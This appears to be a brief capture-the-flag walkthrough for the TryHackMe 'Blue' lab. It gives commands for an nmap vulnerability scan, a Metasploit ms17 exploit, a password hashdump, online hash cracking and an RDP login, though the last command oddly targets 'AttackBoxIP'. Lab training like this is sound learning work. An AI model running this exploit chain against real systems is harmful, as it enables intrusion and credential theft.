# TryHackMe-Blue

This document outlines the steps to successfully complete the TryHackMe Blue room.

## Summary of Steps

1.  **Vulnerability Scan**: Identify potential vulnerabilities on the target machine.
2.  **Use Exploit**: Leverage an exploit to gain initial access.
3.  **Get Password Hash**: Extract password hashes from the compromised system.
4.  **Get Password**: Crack the obtained password hashes.
5.  **Login**: Use the cracked credentials to log in to the target machine.

## 5 Steps to Hack the TryHackMe Blue Room

* Vulnerability Scan​
  ```bash
  nmap --script vuln -T5 TARGET_IP
  ```
* Use Exploit​
  ```bash
  msfconsole
  search ms17
  use 0
  options
  set rhost TARGET_IP
  run
  ```
* Get Password Hash​
  ```bash
  hashdump
  ```
* Get Password​
  ```
  # Use a service like hashes.com
  ```
* Login
  ```bash
  xfreerdp /u:username /p:"password" /v:AttackBoxIP ​
  ```